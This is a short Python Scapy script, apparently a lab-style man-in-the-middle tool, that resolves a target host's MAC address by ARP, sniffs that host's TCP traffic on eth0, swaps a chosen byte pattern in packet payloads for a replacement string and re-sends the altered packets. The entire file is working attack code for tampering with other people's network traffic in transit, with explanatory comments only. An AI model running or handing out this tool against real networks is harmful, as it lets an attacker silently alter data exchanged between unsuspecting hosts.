#!/usr/bin/env python3

from scapy.all import *
import argparse

# Creates an ArgumentParser object to handle command-line arguments
parser = argparse.ArgumentParser()
# Adds required argument: source IP address to filter traffic from
parser.add_argument("--sourceaddress", "-src", required=True, help="Source IP to monitor") # Adds required argument: source IP address to filter traffic from
parser.add_argument("--pattern", "-f", required=False, help="Pattern to find in payload")  #  pattern in the packet's payload that should be replaced
parser.add_argument("--stringreplacement", "-r", required=False, help="Replacement string for pattern")  #string that will replace the pattern if found
args = parser.parse_args()

source_ip = args.sourceaddress
pattern = args.pattern
replacement = args.stringreplacement

# Resolve MAC address of source IP (no try/except)
# Sends an ARP request to find MAC address of source_ip on eth0
# 'rcv.hwsrc' gets the MAC address from the ARP reply
# [0] gets the list of responses
# 'next(...)' takes the first matching MAC address found
mac = next(rcv.hwsrc for _, rcv in arping(source_ip, timeout=2, iface='eth0', verbose=False)[0])
print(f"[+] Resolved {source_ip} to {mac}")
# Filter for TCP packets where the source MAC address matches the resolved MAC
# This ensures only relevant packets are intercepted
bpf = f"tcp and ether host {mac}"

def packet_callback(pkt):
    # Only proceed if the packet contains IP, TCP, and Raw layers (i.e., payload data)
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):
        raw = pkt[Raw].load
        new_payload = raw
        # Check if pattern and replacement are provided and pattern exists in payload
        if pattern and replacement and pattern.encode() in raw:
            pad = b'\x00' * (len(pattern) - len(replacement)) if len(replacement) < len(pattern) else b''      
            replacement_padded = replacement.encode() + pad
            # If replacement is shorter, pad it with null bytes to match original length, Perform the replacement in the payload
            new_payload = raw.replace(pattern.encode(), replacement_padded)
            print(f"[+] Replaced '{pattern}' → '{replacement}'")

        # Clone the original IP packet (as bytes) into a new Scapy IP object
        new_pkt = IP(bytes(pkt[IP]))
        del new_pkt.len, new_pkt.chksum, new_pkt[TCP].chksum, new_pkt[TCP].payload
        # Send the new packet with modified payload; 'verbose=False' suppresses extra output
        send(new_pkt / new_payload, verbose=False)

# Start sniffing on interface eth0 using the defined BPF filter
# For each captured packet, call packet_callback(pkt)
sniff(iface="eth0", filter=bpf, prn=packet_callback)
